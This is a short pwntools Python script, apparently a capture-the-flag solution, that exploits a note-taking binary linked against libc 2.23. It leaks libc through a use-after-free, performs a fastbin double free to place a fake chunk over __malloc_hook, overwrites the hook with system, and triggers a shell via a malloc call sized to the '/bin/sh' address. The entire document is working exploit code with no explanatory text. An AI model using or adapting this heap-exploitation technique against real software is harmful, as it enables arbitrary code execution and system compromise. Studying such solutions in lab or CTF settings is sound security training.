#!/usr/bin/env python

from pwn import *

r = process( './note' )
libc = ELF( './libc-2.23.so' )

libc_offset = 0x3c4b78

def add( size, note ):
    r.sendlineafter( '>', '1' )
    r.sendlineafter( 'Size:', str( size ) )
    r.sendlineafter( 'Note:', note )

def delete( index ):
    r.sendlineafter( '>', '3' )
    r.sendlineafter( 'Index:', str( index ) )

def show( index ):
    r.sendlineafter( '>', '2' )
    r.sendlineafter( 'Index:', str( index ) )

add( 256, 'aaa' )
add( 96, 'bbb' )
delete( 0 )
show( 0 )
r.recvuntil( '\n' )
libc_leak = u64( r.recv( 6 ) + '\x00\x00' )
libc.address = libc_leak - libc_offset
log.success( 'libc base : ' + hex( libc.address ) )

log.success( 'malloc_hook : ' + hex(libc.symbols['__malloc_hook']) )

add( 96, 'ccc' )
delete( 0 )
delete( 1 )
delete( 0 )

add( 96, p64( libc.symbols['__malloc_hook'] - 0x10 - 3 ) ) # fake chunk
add( 96, 'aaa' )
add( 96, 'bbb' )
one_gadget_exp = libc.symbols['system']
bin_sh = libc.search( '/bin/sh' ).next()
log.info( '/bin/sh address : ' + hex( bin_sh ) )
add( 96, 'bbb' + p64( one_gadget_exp ) )

r.sendlineafter( '>', '1' )
r.sendlineafter( 'Size:', str( bin_sh ) )

r.interactive()
